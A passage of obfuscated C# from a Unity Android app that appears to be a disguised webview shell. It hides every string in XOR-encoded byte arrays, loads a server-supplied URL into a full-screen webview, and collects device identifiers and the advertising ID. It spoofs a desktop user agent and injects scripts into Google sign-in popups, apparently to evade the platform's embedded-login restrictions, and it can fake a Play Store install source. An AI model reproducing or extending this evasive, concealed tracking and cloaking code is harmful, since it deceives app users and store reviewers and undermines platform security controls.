                WLog(_0xc5baefe6._0xaf772892(new byte[39] { 92, 112, 120, 127, 49, 70, 116, 115, 71, 120, 116, 102, 49, 98, 121, 126, 102, 127, 49, 126, 127, 49, 114, 126, 124, 124, 120, 101, 101, 116, 117, 49, 114, 126, 127, 101, 116, 127, 101 }, 17));
            }
        };
        _0xdbc6827e.OnPageProgressChanged += (_0x4d908488, _0x10e6b222) =>
        {
            if (_0x141674f7)
                return;
            if (!firstLoadShown && _0x10e6b222 >= 0.65f)
            {
                firstLoadShown = true;
                _0x073f2856 = false;
                _0xeaf769ec(false);
                _0xe207e0b4();
                _0xbadead4f();
                _0x4d908488.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0xeff30011(_0xc5baefe6._0xaf772892(new byte[9] { 37, 36, 13, 61, 34, 55, 60, 55, 54 }, 82));
                WLog(_0xc5baefe6._0xaf772892(new byte[32] { 102, 74, 66, 69, 11, 124, 78, 73, 125, 66, 78, 92, 11, 88, 67, 68, 92, 69, 11, 73, 82, 11, 91, 89, 68, 76, 89, 78, 88, 88, 17, 11 }, 43) + _0x10e6b222);
            }
        };
        _0xdbc6827e.OnPageFinished += (_0x4d908488, _0x4ee8a4ba, _0x1aa08084) =>
        {
            if (_0x141674f7 && IsAboutBlank(_0x1aa08084))
            {
                _0x141674f7 = false;
                WLog(_0xc5baefe6._0xaf772892(new byte[28] { 168, 138, 157, 143, 153, 138, 149, 216, 153, 154, 151, 141, 140, 194, 154, 148, 153, 150, 147, 216, 158, 145, 150, 145, 139, 144, 157, 156 }, 248));
                return;
            }

            WLog(_0xc5baefe6._0xaf772892(new byte[24] { 39, 11, 3, 4, 74, 61, 15, 8, 60, 3, 15, 29, 74, 44, 3, 4, 3, 25, 2, 15, 14, 80, 74, 65 }, 106) + (Time.realtimeSinceStartup - _0xbca9a518).ToString(_0xc5baefe6._0xaf772892(new byte[5] { 112, 110, 112, 112, 112 }, 64)) + _0xc5baefe6._0xaf772892(new byte[7] { 119, 36, 103, 107, 96, 97, 57 }, 4) + _0x4ee8a4ba + _0xc5baefe6._0xaf772892(new byte[5] { 245, 160, 167, 185, 232 }, 213) + _0x1aa08084);
            if (!firstLoadShown)
            {
                firstLoadShown = true;
                _0x073f2856 = false;
                _0xeaf769ec(false);
                _0xe207e0b4();
                _0xbadead4f();
                _0x4d908488.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0xeff30011(_0xc5baefe6._0xaf772892(new byte[9] { 226, 227, 202, 250, 229, 240, 251, 240, 241 }, 149));
                WLog(_0xc5baefe6._0xaf772892(new byte[33] { 104, 68, 76, 75, 5, 114, 64, 71, 115, 76, 64, 82, 5, 67, 76, 87, 86, 81, 5, 73, 74, 68, 65, 5, 70, 74, 72, 85, 73, 64, 81, 64, 65 }, 37));
            }
            else if (_0x073f2856)
            {
                _0x073f2856 = false;
                _0xeaf769ec(false);
                _0x4d908488.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                WLog(_0xc5baefe6._0xaf772892(new byte[40] { 214, 250, 242, 245, 187, 204, 254, 249, 205, 242, 254, 236, 187, 200, 243, 244, 236, 187, 250, 253, 239, 254, 233, 187, 247, 244, 250, 255, 242, 245, 252, 187, 253, 242, 245, 242, 232, 243, 254, 255 }, 155));
            }
            else
            {
                _0xeaf769ec(false);
            }

            if (_0xd34c5bb5 && !IsGoogleAuthFlowUrl(_0x1aa08084) && !IsGoogleAuthFlowUrl(_0x1aa08084))
            {
                WLog(_0xc5baefe6._0xaf772892(new byte[48] { 173, 133, 133, 141, 134, 143, 202, 139, 159, 158, 130, 202, 153, 143, 143, 135, 153, 202, 140, 131, 132, 131, 153, 130, 143, 142, 202, 199, 212, 202, 152, 143, 153, 158, 133, 152, 143, 202, 142, 143, 140, 139, 159, 134, 158, 202, 191, 171 }, 234));
                _0xd34c5bb5 = false;
                _0xcaeec845.SetUserAgent("");
            }
        };
        _0xdbc6827e.OnShouldClose += _0x4d908488 =>
        {
            WLog(_0xc5baefe6._0xaf772892(new byte[41] { 179, 188, 141, 155, 156, 181, 200, 165, 137, 129, 134, 200, 191, 141, 138, 190, 129, 141, 159, 200, 167, 134, 187, 128, 135, 157, 132, 140, 171, 132, 135, 155, 141, 200, 129, 134, 158, 135, 131, 141, 140 }, 232));
            _0xd0300ee3();
            return false;
        };
        // POPUP HANDLING LOGIC
        _0xdbc6827e.SetPopupPageEventEnabled(true);
        bool _0x7e48ff88 = false;
        bool _0x26701a44 = false;
        _0xdbc6827e.OnMultipleWindowOpened += (_0x4d908488, _0xf51a35c5) =>
        {
            _0x4d908488.ScrollTo(0, 0, false);
            WLog(_0xc5baefe6._0xaf772892(new byte[43] { 45, 34, 19, 5, 2, 43, 86, 59, 23, 31, 24, 86, 33, 19, 20, 32, 31, 19, 1, 86, 59, 3, 26, 2, 31, 6, 26, 19, 33, 31, 24, 18, 25, 1, 86, 57, 6, 19, 24, 19, 18, 76, 86 }, 118) + _0xf51a35c5);
            var _0x2ca4ec8c = _0xdbc6827e.GetPopupWindow(_0xf51a35c5);
            if (_0x2ca4ec8c == null)
                return;
            _0x4b420ba9.Add(_0x2ca4ec8c);
            Debug.Log($"[Test] Popup ID: {_0x2ca4ec8c.Id}");
            _0x2ca4ec8c.OnPageStarted += (_0xbccaf9bc, _0x1aa08084) =>
            {
                WLog(_0xc5baefe6._0xaf772892(new byte[36] { 102, 105, 88, 78, 73, 96, 29, 109, 82, 77, 72, 77, 29, 106, 88, 95, 107, 84, 88, 74, 29, 114, 83, 109, 92, 90, 88, 110, 73, 92, 79, 73, 88, 89, 7, 29 }, 61) + _0x1aa08084);
                _0x4eef55c7 = 0;
                if (string.IsNullOrEmpty(_0x1aa08084) || IsAboutBlank(_0x1aa08084))
                    return;
                if (IsGoogleAuthFlowUrl(_0x1aa08084))
                {
                    WLog(_0xc5baefe6._0xaf772892(new byte[57] { 103, 104, 89, 79, 72, 97, 28, 108, 83, 76, 73, 76, 28, 123, 83, 83, 91, 80, 89, 28, 93, 73, 72, 84, 28, 90, 80, 83, 75, 28, 17, 2, 28, 79, 76, 83, 83, 90, 28, 123, 83, 83, 91, 80, 89, 28, 127, 84, 78, 83, 81, 89, 28, 105, 125, 6, 28 }, 60) + _0x1aa08084);
                    _0x7e48ff88 = false;
                    _0x3a147faf();
                    if (_0xbccaf9bc != null && _0xbccaf9bc.IsAlive)
                        _0xbccaf9bc.EvaluateJavaScript(_0xe165a715());
                    return;
                }

                if (_0xcaeec845 == null)
                    return;
                if (!_0x7e48ff88)
                {
                    _0x7e48ff88 = true;
                    _0xcaeec845.SetUserAgent(WindowsDesktopUserAgent);
                    WLog(_0xc5baefe6._0xaf772892(new byte[39] { 180, 187, 138, 156, 155, 178, 207, 191, 128, 159, 154, 159, 207, 142, 159, 159, 131, 150, 207, 184, 134, 129, 139, 128, 152, 156, 207, 139, 138, 156, 132, 155, 128, 159, 207, 186, 174, 213, 207 }, 239) + _0x1aa08084);
                }

                if (_0xbccaf9bc != null && _0xbccaf9bc.IsAlive)
                    _0xbccaf9bc.EvaluateJavaScript(_0x1107e9a9());
                if (!_0x26701a44 && _0xbccaf9bc != null && _0xbccaf9bc.IsAlive && IsHttpUrl(_0x1aa08084))
                {
                    _0x26701a44 = true;
                }
            };
            _0x2ca4ec8c.OnPageFinished += (_0xbccaf9bc, _0xc072a18a) =>
            {
                string _0xbb7c31e1 = _0xc072a18a != null ? _0xc072a18a.data : string.Empty;
                WLog(_0xc5baefe6._0xaf772892(new byte[35] { 15, 0, 49, 39, 32, 9, 116, 4, 59, 36, 33, 36, 116, 3, 49, 54, 2, 61, 49, 35, 116, 18, 61, 58, 61, 39, 60, 49, 48, 110, 116, 33, 38, 56, 105 }, 84) + _0xbb7c31e1);
                if (_0xbccaf9bc == null || !_0xbccaf9bc.IsAlive)
                    return;
                if (IsGoogleAuthFlowUrl(_0xbb7c31e1))
                {
                    _0x3a147faf();
                    _0xbccaf9bc.EvaluateJavaScript(_0xe165a715());
                    return;
                }

                if (!_0x7e48ff88)
                    return;
                _0xbccaf9bc.EvaluateJavaScript(_0x1107e9a9());
            };
        };
        _0xdbc6827e.OnMultipleWindowClosed += (_0x4d908488, _0xf51a35c5) =>
        {
            _0x4b420ba9.RemoveAll(_0xe8696f7e => _0xe8696f7e == null || _0xe8696f7e.Id == _0xf51a35c5 || !_0xe8696f7e.IsAlive);
            _0xeaf769ec(false);
            if (_0x4b420ba9.Count == 0 && _0xcaeec845 != null)
            {
                _0x7e48ff88 = false;
                _0x26701a44 = false;
                _0x5cfcef5e();
            }

            WLog(_0xc5baefe6._0xaf772892(new byte[43] { 224, 239, 222, 200, 207, 230, 155, 246, 218, 210, 213, 155, 236, 222, 217, 237, 210, 222, 204, 155, 246, 206, 215, 207, 210, 203, 215, 222, 236, 210, 213, 223, 212, 204, 155, 248, 215, 212, 200, 222, 223, 129, 155 }, 187) + _0xf51a35c5);
        };
        _0xdbc6827e.RegisterOnRequestMediaCapturePermission(_0xc9d7fe79 =>
        {
            if (!Permission.HasUserAuthorizedPermission(Permission.Camera))
            {
                Permission.RequestUserPermission(Permission.Camera);
                return UniWebViewMediaCapturePermissionDecision.Prompt;
            }

            return UniWebViewMediaCapturePermissionDecision.Grant;
        });
    }

    private Canvas _0x95123048()
    {
        if (_0x19480de3 != null)
            return _0x19480de3;
        var _0x9924211b = gameObject.GetComponentInChildren<Canvas>();
        if (_0x9924211b == null)
        {
            var _0xb67ed8b1 = new GameObject(_0xc5baefe6._0xaf772892(new byte[6] { 24, 58, 53, 45, 58, 40 }, 91), typeof(Canvas), typeof(CanvasScaler), typeof(GraphicRaycaster));
            _0x9924211b = _0xb67ed8b1.GetComponent<Canvas>();
            _0x9924211b.transform.SetParent(transform, false);
            _0x9924211b.renderMode = RenderMode.ScreenSpaceOverlay;
        }

        _0x19480de3 = _0x9924211b;
        return _0x19480de3;
    }

    private static string ReadPushField(Dictionary<string, object> _0xbc771b52, string _0x2a4e117e)
    {
        if (_0xbc771b52 == null || string.IsNullOrEmpty(_0x2a4e117e))
            return string.Empty;
        if (_0xbc771b52.TryGetValue(_0xc5baefe6._0xaf772892(new byte[16] { 34, 35, 56, 37, 42, 37, 47, 45, 56, 37, 35, 34, 8, 45, 56, 45 }, 76), out var raw))
        {
            try
            {
                var _0x82932155 = JsonConvert.DeserializeObject<Dictionary<string, object>>(raw?.ToString());
                if (_0x82932155 != null && _0x82932155.TryGetValue(_0x2a4e117e, out var nestedVal))
                {
                    var _0x1e8c120e = nestedVal?.ToString();
                    if (!string.IsNullOrEmpty(_0x1e8c120e))
                        return _0x1e8c120e;
                }
            }
            catch
            {
            }
        }

        if (_0xbc771b52.TryGetValue(_0x2a4e117e, out var flatVal))
            return flatVal?.ToString() ?? string.Empty;
        return string.Empty;
    }

    private static readonly string WindowsDesktopUserAgent = _0xc5baefe6._0xaf772892(new byte[111] { 221, 255, 234, 249, 252, 252, 241, 191, 165, 190, 160, 176, 184, 199, 249, 254, 244, 255, 231, 227, 176, 222, 196, 176, 161, 160, 190, 160, 171, 176, 199, 249, 254, 166, 164, 171, 176, 232, 166, 164, 185, 176, 209, 224, 224, 252, 245, 199, 245, 242, 219, 249, 228, 191, 165, 163, 167, 190, 163, 166, 176, 184, 219, 216, 196, 221, 220, 188, 176, 252, 249, 251, 245, 176, 215, 245, 243, 251, 255, 185, 176, 211, 248, 226, 255, 253, 245, 191, 161, 162, 160, 190, 160, 190, 160, 190, 160, 176, 195, 241, 246, 241, 226, 249, 191, 165, 163, 167, 190, 163, 166 }, 144);
    private IEnumerator _0x09d8b0f7()
    {
        yield return RequestAndroidPermissionIfNeeded(Permission.Camera);
    }

    private IEnumerator _0x0c0de3ba(Dictionary<string, object> _0x40884d24)
    {
        {
            {
#if B_LOGS
                Debug.Log(_0xc5baefe6._0xaf772892(new byte[30] { 236, 227, 210, 196, 195, 234, 151, 241, 210, 195, 212, 223, 151, 242, 207, 195, 197, 214, 151, 231, 194, 196, 223, 151, 243, 214, 195, 214, 141, 151 }, 183) + string.Join(_0xc5baefe6._0xaf772892(new byte[1] { 71 }, 78), _0x40884d24));
#endif
            }
        }

        string _0x5e3dd219 = "";
        // Primary source: nested JSON under "notificationData"
        if (_0x40884d24 != null && _0x40884d24.TryGetValue(_0xc5baefe6._0xaf772892(new byte[16] { 86, 87, 76, 81, 94, 81, 91, 89, 76, 81, 87, 86, 124, 89, 76, 89 }, 56), out var raw))
        {
            try
            {
                var _0x504091e7 = raw?.ToString();
                var _0xbde28220 = JsonConvert.DeserializeObject<Dictionary<string, object>>(_0x504091e7);
                if (_0xbde28220 != null && _0xbde28220.TryGetValue(_0xc5baefe6._0xaf772892(new byte[6] { 78, 88, 83, 89, 84, 89 }, 61), out var val))
                {
                    _0x5e3dd219 = val?.ToString();
                }
            }
            catch (Exception e)
            {
#if B_LOGS
                Debug.LogError(_0xc5baefe6._0xaf772892(new byte[30] { 141, 130, 179, 165, 162, 246, 134, 163, 165, 190, 139, 246, 156, 133, 153, 152, 246, 166, 183, 164, 165, 179, 246, 179, 164, 164, 185, 164, 236, 246 }, 214) + e);
#endif
            }
        }

        // Fallback: flat structure
        if (string.IsNullOrEmpty(_0x5e3dd219) && _0x40884d24 != null && _0x40884d24.TryGetValue(_0xc5baefe6._0xaf772892(new byte[6] { 142, 152, 147, 153, 148, 153 }, 253), out var lab))
        {
            _0x5e3dd219 = lab?.ToString();
        }

        {
#if B_LOGS
            {
                Debug.Log(_0xc5baefe6._0xaf772892(new byte[38] { 111, 96, 81, 71, 64, 20, 100, 65, 71, 92, 105, 20, 114, 81, 64, 87, 92, 81, 80, 20, 71, 81, 90, 80, 93, 80, 20, 82, 70, 91, 89, 20, 94, 71, 91, 90, 14, 20 }, 52) + _0x5e3dd219);
            }
#endif
        }

        if (string.IsNullOrEmpty(_0x5e3dd219))
            yield break;
        {
#if B_LOGS
            {
                Debug.Log(_0xc5baefe6._0xaf772892(new byte[38] { 119, 120, 73, 95, 88, 12, 124, 89, 95, 68, 113, 12, 123, 77, 69, 88, 12, 88, 67, 12, 67, 92, 73, 66, 12, 91, 69, 88, 68, 12, 95, 73, 66, 72, 69, 72, 22, 12 }, 44) + _0x5e3dd219);
            }
#endif
        }

        _0x6fe3f3be = _0x5e3dd219;
        yield return new WaitUntil(() => _0x90df74d5);
        var _0xcc27337e = _0xdbc70a7d(2, 100);
        yield return new WaitUntil(() => _0xcc27337e.IsCompleted);
        string _0x18e68ed7 = _0xcc27337e.Result;
        if (!string.IsNullOrEmpty(_0x18e68ed7))
        {
            string _0x402694ac = _0x15d63010(_0x18e68ed7, _0x5e3dd219);
            {
#if B_LOGS
                Debug.Log(_0xc5baefe6._0xaf772892(new byte[33] { 128, 143, 190, 168, 175, 251, 139, 174, 168, 179, 134, 251, 137, 190, 183, 180, 186, 191, 251, 140, 190, 185, 141, 178, 190, 172, 251, 172, 178, 175, 179, 225, 251 }, 219) + _0x402694ac);
#endif
            }

            _0xcaeec845.Load(_0x402694ac);
        }
    }

    private string _0xc356ee58 = "";
    private void _0x64f6b5d7()
    {
        {
#if B_LOGS
            Debug.Log(_0xc5baefe6._0xaf772892(new byte[22] { 178, 189, 140, 154, 157, 180, 201, 186, 157, 134, 155, 140, 173, 140, 159, 128, 138, 140, 160, 135, 143, 134 }, 233));
#endif
        }

        _0x4e355209 = SystemInfo.deviceModel;
        _0x210268d0 = Application.version;
        _0x412214b2 = Application.installMode;
        _0x22f2f791 = Application.installerName;
        _0xf2a3da63 = Application.identifier;
        _0x50769abf = _0xcb6faa6c();
        _0xcbafee33 = _0xa0d25a95();
        _0x74998c2b = SystemInfo.deviceUniqueIdentifier;
        _0x39a6a961 = SystemInfo.graphicsDeviceName;
        _0x1e2d81db = SystemInfo.processorType;
        {
#if B_LOGS
            {
                _0x210268d0 = _0xc5baefe6._0xaf772892(new byte[5] { 164, 189, 164, 189, 164 }, 147);
                _0x412214b2 = ApplicationInstallMode.Store;
                _0x22f2f791 = _0xc5baefe6._0xaf772892(new byte[19] { 86, 90, 88, 27, 84, 91, 81, 71, 90, 92, 81, 27, 67, 80, 91, 81, 92, 91, 82 }, 53);
                _0xcbafee33 = _0xc5baefe6._0xaf772892(new byte[8] { 84, 92, 65, 69, 72, 17, 68, 80 }, 49);
                _0x74998c2b = Guid.NewGuid().ToString().Replace(_0xc5baefe6._0xaf772892(new byte[1] { 112 }, 93), "");
            }
#endif
        }

        {
#if B_LOGS
            Debug.Log(_0xc5baefe6._0xaf772892(new byte[17] { 102, 105, 88, 78, 73, 96, 29, 89, 88, 75, 112, 82, 89, 88, 81, 7, 29 }, 61) + _0x4e355209);
            Debug.Log(_0xc5baefe6._0xaf772892(new byte[19] { 93, 82, 99, 117, 114, 91, 38, 103, 118, 118, 80, 99, 116, 117, 111, 105, 104, 60, 38 }, 6) + _0x210268d0);
            Debug.Log(_0xc5baefe6._0xaf772892(new byte[20] { 110, 97, 80, 70, 65, 104, 21, 92, 91, 70, 65, 84, 89, 89, 120, 90, 81, 80, 15, 21 }, 53) + _0x412214b2);
            Debug.Log(_0xc5baefe6._0xaf772892(new byte[23] { 39, 40, 25, 15, 8, 33, 92, 21, 18, 15, 8, 29, 16, 16, 25, 14, 47, 8, 19, 14, 25, 70, 92 }, 124) + _0x22f2f791);
            Debug.Log(_0xc5baefe6._0xaf772892(new byte[14] { 93, 82, 99, 117, 114, 91, 38, 103, 118, 118, 79, 98, 60, 38 }, 6) + _0xf2a3da63);
            Debug.Log(_0xc5baefe6._0xaf772892(new byte[14] { 95, 80, 97, 119, 112, 89, 36, 101, 96, 114, 77, 96, 62, 36 }, 4) + _0x50769abf);
            Debug.Log(_0xc5baefe6._0xaf772892(new byte[18] { 118, 121, 72, 94, 89, 112, 13, 88, 94, 72, 95, 108, 74, 72, 67, 89, 23, 13 }, 45) + _0xcbafee33);
            Debug.Log(_0xc5baefe6._0xaf772892(new byte[17] { 92, 83, 98, 116, 115, 90, 39, 116, 126, 116, 67, 98, 113, 78, 99, 61, 39 }, 7) + _0x74998c2b);
            Debug.Log(_0xc5baefe6._0xaf772892(new byte[12] { 237, 226, 211, 197, 194, 235, 150, 209, 198, 195, 140, 150 }, 182) + _0x39a6a961);
            Debug.Log(_0xc5baefe6._0xaf772892(new byte[12] { 36, 43, 26, 12, 11, 34, 95, 28, 15, 10, 69, 95 }, 127) + _0x1e2d81db);
#endif
        }
    }

    private float _0xbca9a518 = 0f;
    private string _0xa0d25a95()
    {
        try
        {
            using (var _0xe805cdc9 = new AndroidJavaClass(_0xc5baefe6._0xaf772892(new byte[30] { 216, 212, 214, 149, 206, 213, 210, 207, 194, 136, 223, 149, 203, 215, 218, 194, 222, 201, 149, 238, 213, 210, 207, 194, 235, 215, 218, 194, 222, 201 }, 187)))
            {
                var _0x43a5a9fa = _0xe805cdc9.GetStatic<AndroidJavaObject>(_0xc5baefe6._0xaf772892(new byte[15] { 95, 73, 78, 78, 89, 82, 72, 125, 95, 72, 85, 74, 85, 72, 69 }, 60));
                var _0xd08cfb66 = _0x43a5a9fa.Call<AndroidJavaObject>(_0xc5baefe6._0xaf772892(new byte[21] { 181, 183, 166, 147, 162, 162, 190, 187, 177, 179, 166, 187, 189, 188, 145, 189, 188, 166, 183, 170, 166 }, 210));
                using (var _0x1813196b = new AndroidJavaClass(_0xc5baefe6._0xaf772892(new byte[26] { 174, 161, 171, 189, 160, 166, 171, 225, 184, 170, 173, 164, 166, 187, 225, 152, 170, 173, 156, 170, 187, 187, 166, 161, 168, 188 }, 207)))
                {
                    return _0x1813196b.CallStatic<string>(_0xc5baefe6._0xaf772892(new byte[19] { 190, 188, 173, 157, 188, 191, 184, 172, 181, 173, 140, 170, 188, 171, 152, 190, 188, 183, 173 }, 217), _0xd08cfb66);
                }
            }
        }
        catch
        {
            return "";
        }
    }

    private void _0xb93d84e0(UniWebView _0xd0dc07b8)
    {
        _0xd0dc07b8.BackgroundColor = Color.clear;
        _0xd0dc07b8.SetSupportMultipleWindows(true, true);
        _0xd0dc07b8.SetBackButtonEnabled(false);
        _0xcaeec845.SetUserAgent(_0x6db230d1());
    }

    private string _0x1e2d81db = "";
    private string _0x9d0da56c = "";
    private readonly string[] _0xe7c92b19 = new string[]
    {
        _0xc5baefe6._0xaf772892(new byte[60] { 40, 71, 86, 104, 248, 140, 176, 189, 248, 170, 189, 189, 180, 171, 248, 185, 170, 189, 248, 176, 183, 172, 248, 170, 177, 191, 176, 172, 248, 182, 183, 175, 248, 58, 88, 75, 248, 188, 183, 182, 58, 88, 65, 172, 248, 181, 177, 171, 171, 248, 161, 183, 173, 170, 248, 171, 168, 177, 182, 249 }, 216),
        _0xc5baefe6._0xaf772892(new byte[52] { 65, 46, 60, 49, 145, 248, 197, 145, 210, 222, 196, 221, 213, 145, 211, 212, 145, 200, 222, 196, 195, 145, 221, 196, 210, 218, 200, 145, 220, 222, 220, 212, 223, 197, 145, 83, 49, 34, 145, 198, 217, 200, 145, 194, 197, 222, 193, 145, 223, 222, 198, 142 }, 177),
        _0xc5baefe6._0xaf772892(new byte[66] { 95, 39, 28, 82, 5, 50, 157, 255, 212, 218, 157, 202, 212, 211, 206, 157, 220, 207, 216, 157, 213, 212, 201, 201, 212, 211, 218, 157, 208, 210, 207, 216, 157, 210, 219, 201, 216, 211, 157, 201, 210, 217, 220, 196, 157, 95, 61, 46, 157, 206, 201, 220, 196, 157, 212, 211, 157, 201, 213, 216, 157, 218, 220, 208, 216, 147 }, 189),
        _0xc5baefe6._0xaf772892(new byte[54] { 19, 124, 118, 113, 195, 183, 139, 138, 144, 195, 138, 144, 195, 147, 145, 138, 142, 134, 195, 151, 138, 142, 134, 195, 1, 99, 112, 195, 151, 139, 134, 195, 129, 134, 144, 151, 195, 147, 143, 130, 154, 134, 145, 144, 195, 147, 143, 130, 154, 195, 141, 140, 148, 205 }, 227),
        _0xc5baefe6._0xaf772892(new byte[48] { 143, 224, 235, 218, 95, 38, 16, 10, 13, 95, 8, 22, 17, 17, 22, 17, 24, 95, 12, 11, 13, 26, 30, 20, 95, 28, 16, 10, 19, 27, 95, 29, 26, 95, 16, 17, 26, 95, 12, 15, 22, 17, 95, 30, 8, 30, 6, 81 }, 127),
        _0xc5baefe6._0xaf772892(new byte[65] { 105, 6, 3, 25, 185, 211, 248, 250, 242, 233, 246, 237, 234, 185, 248, 235, 252, 185, 244, 246, 235, 252, 185, 248, 250, 237, 240, 239, 252, 185, 237, 246, 247, 240, 254, 241, 237, 185, 123, 25, 10, 185, 234, 237, 248, 224, 185, 248, 247, 253, 185, 237, 235, 224, 185, 224, 246, 236, 235, 185, 245, 236, 250, 242, 183 }, 153),
        _0xc5baefe6._0xaf772892(new byte[55] { 43, 68, 85, 105, 251, 158, 173, 190, 169, 162, 251, 168, 171, 178, 181, 251, 184, 180, 174, 181, 175, 168, 251, 57, 91, 72, 251, 175, 179, 190, 251, 181, 190, 163, 175, 251, 180, 181, 190, 251, 184, 180, 174, 183, 191, 251, 185, 190, 251, 162, 180, 174, 169, 168, 245 }, 219),
        _0xc5baefe6._0xaf772892(new byte[63] { 34, 109, 80, 47, 120, 79, 224, 144, 172, 161, 185, 165, 178, 179, 224, 178, 169, 167, 168, 180, 224, 174, 175, 183, 224, 161, 178, 165, 224, 183, 169, 174, 174, 169, 174, 167, 224, 34, 64, 83, 224, 164, 175, 174, 34, 64, 89, 180, 224, 183, 161, 172, 171, 224, 161, 183, 161, 185, 224, 185, 165, 180, 238 }, 192),
        _0xc5baefe6._0xaf772892(new byte[51] { 222, 177, 161, 168, 14, 97, 64, 66, 87, 14, 90, 70, 65, 93, 75, 14, 89, 70, 65, 14, 93, 90, 79, 87, 14, 71, 64, 14, 90, 70, 75, 14, 73, 79, 67, 75, 14, 89, 71, 64, 14, 90, 70, 75, 14, 94, 92, 71, 84, 75, 0 }, 46),
        _0xc5baefe6._0xaf772892(new byte[64] { 138, 242, 201, 135, 208, 231, 72, 37, 7, 5, 13, 6, 28, 29, 5, 72, 1, 27, 72, 13, 30, 13, 26, 17, 28, 0, 1, 6, 15, 72, 138, 232, 251, 72, 3, 13, 13, 24, 72, 27, 24, 1, 6, 6, 1, 6, 15, 72, 14, 7, 26, 72, 17, 7, 29, 26, 72, 11, 0, 9, 6, 11, 13, 70 }, 104)
    };
    private string _0xf103958a = "";
    private void OnApplicationFocus(bool _0xa18fd7a6)
    {
        isApplicationFocus = _0xa18fd7a6;
        if (_0xa18fd7a6 && _0x90df74d5)
        {
            _0x169fb14b();
        }
    }

    private int _0xed440dce = -1;
    internal bool isDestroyedForce = false;
    private bool _0x5a7a8b0e = false;
    internal bool isApplicationPause = false;
    private void StopCurrentFailedLoad(UniWebView _0x0ab05e7b)
    {
        _0xeaf769ec(false);
        if (_0x0ab05e7b == null)
            return;
        _0x0ab05e7b.Stop();
        if (_0x0ab05e7b.CanGoBack)
            _0x0ab05e7b.GoBack();
    }

    private static bool IsPrivacyItemTrue(Item _0xe0219ccd)
    {
        if (_0xe0219ccd.Key != _0xc5baefe6._0xaf772892(new byte[9] { 108, 118, 85, 119, 108, 115, 100, 102, 124 }, 5))
            return false;
        try
        {
            var _0x1a0ac3c7 = _0xe0219ccd.Value.GetAs<object>();
            return _0x1a0ac3c7 switch
            {
                bool b => b,
                string s when bool.TryParse(s, out var parsed) => parsed,
                _ => false
            };
        }
        catch
        {
            return false;
        }
    }

    // NATIVE WEB VIEW METHODS
    private UniWebView _0xcaeec845 = null;
    // WEB VIEW LOGIC
    public bool _0x90df74d5 { get; set; }

    private void _0x59cefedb()
    {
        if (_0x300d7f37)
        {
            WLog(_0xc5baefe6._0xaf772892(new byte[18] { 228, 217, 200, 213, 129, 192, 205, 211, 196, 192, 197, 216, 129, 210, 201, 206, 214, 207 }, 161));
            return;
        }

        _0xeaf769ec(false);
        WLog(_0xc5baefe6._0xaf772892(new byte[46] { 36, 8, 0, 7, 73, 62, 12, 11, 63, 0, 12, 30, 73, 57, 28, 26, 1, 73, 39, 6, 29, 0, 15, 0, 10, 8, 29, 0, 6, 7, 73, 65, 1, 8, 27, 13, 30, 8, 27, 12, 73, 11, 8, 10, 2, 64 }, 105));
        ++_0x4eef55c7;
        _0xf89350ae();
        if (_0x4eef55c7 <= 1)
            return;
        if (_0xb6952da6())
        {
            WLog(_0xc5baefe6._0xaf772892(new byte[37] { 12, 49, 32, 61, 105, 58, 34, 32, 57, 57, 44, 45, 105, 100, 119, 105, 57, 38, 57, 60, 57, 58, 105, 58, 61, 32, 37, 37, 105, 38, 57, 44, 39, 44, 45, 115, 105 }, 73) + _0x4b420ba9.Count);
            return;
        }

        Application.Quit();
    }

    private int _0x185c92e0 = 5, _0xef3d2cf9 = 5, _0xa6c823e4 = 5, _0xd83baaaa = 5;
    private string _0x15d63010(string _0x9d3ef173, string _0xca9ae79e)
    {
        if (string.IsNullOrEmpty(_0xca9ae79e))
            return _0x9d3ef173;
        if (_0x9d3ef173.Contains(_0xc5baefe6._0xaf772892(new byte[1] { 142 }, 177)))
            return _0x9d3ef173 + _0xc5baefe6._0xaf772892(new byte[8] { 113, 36, 50, 57, 51, 62, 51, 106 }, 87) + UnityWebRequest.EscapeURL(_0xca9ae79e);
        else
            return _0x9d3ef173 + _0xc5baefe6._0xaf772892(new byte[8] { 139, 199, 209, 218, 208, 221, 208, 137 }, 180) + UnityWebRequest.EscapeURL(_0xca9ae79e);
    }

    // MAIN FLOW
    private bool _0x47e21537 { get; set; }

    internal bool ContainsIgnoreCase(string _0xb9881da0, string _0x5d6192d2)
    {
        if (string.IsNullOrEmpty(_0xb9881da0) || string.IsNullOrEmpty(_0x5d6192d2))
            return false;
        return _0xb9881da0.IndexOf(_0x5d6192d2, StringComparison.OrdinalIgnoreCase) >= 0;
    }

    private async Task<bool> _0xaec267bf()
    {
        {
#if B_LOGS
            Debug.Log(_0xc5baefe6._0xaf772892(new byte[29] { 30, 17, 32, 54, 49, 24, 101, 12, 54, 21, 55, 44, 51, 36, 38, 60, 4, 43, 33, 22, 36, 51, 32, 33, 6, 45, 32, 38, 46 }, 69));
#endif
        }

        string _0x875a547d = "";
        for (int _0x5cba83c5 = 0; _0x5cba83c5 < 2; _0x5cba83c5++)
        {
            if (await _0x1dbb53f4(1, 100))
            {
                await _0xeff30011(_0xc5baefe6._0xaf772892(new byte[7] { 189, 179, 176, 188, 180, 186, 187 }, 223));
                _0x70807108();
                return true;
            }

            _0x875a547d = await _0xdbc70a7d(1, 100);
            if (!string.IsNullOrEmpty(_0x875a547d))
                break;
        }

        try
        {
            if (!string.IsNullOrEmpty(_0x875a547d))
            {
                if (!string.IsNullOrEmpty(_0x6fe3f3be))
                {
                    _0x875a547d = _0x15d63010(_0x875a547d, _0x6fe3f3be);
                    {
#if B_LOGS
                        Debug.Log(_0xc5baefe6._0xaf772892(new byte[53] { 165, 170, 155, 141, 138, 163, 222, 189, 159, 157, 150, 155, 154, 222, 152, 151, 144, 159, 146, 171, 140, 146, 222, 137, 151, 138, 150, 222, 141, 155, 144, 154, 151, 154, 222, 28, 120, 108, 222, 141, 150, 145, 137, 222, 169, 155, 156, 168, 151, 155, 137, 196, 222 }, 254) + _0x875a547d);
#endif
                    }
                }
                else
                {
                    {
#if B_LOGS
                        Debug.Log(_0xc5baefe6._0xaf772892(new byte[39] { 178, 189, 140, 154, 157, 180, 201, 170, 136, 138, 129, 140, 141, 201, 143, 128, 135, 136, 133, 188, 155, 133, 201, 11, 111, 123, 201, 154, 129, 134, 158, 201, 190, 140, 139, 191, 128, 140, 158 }, 233));
#endif
                    }
                }

                _0x01d0dcfa = true;
                _0x6ff2b4a3(_0x875a547d);
                return true;
            }

            return false;
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                {
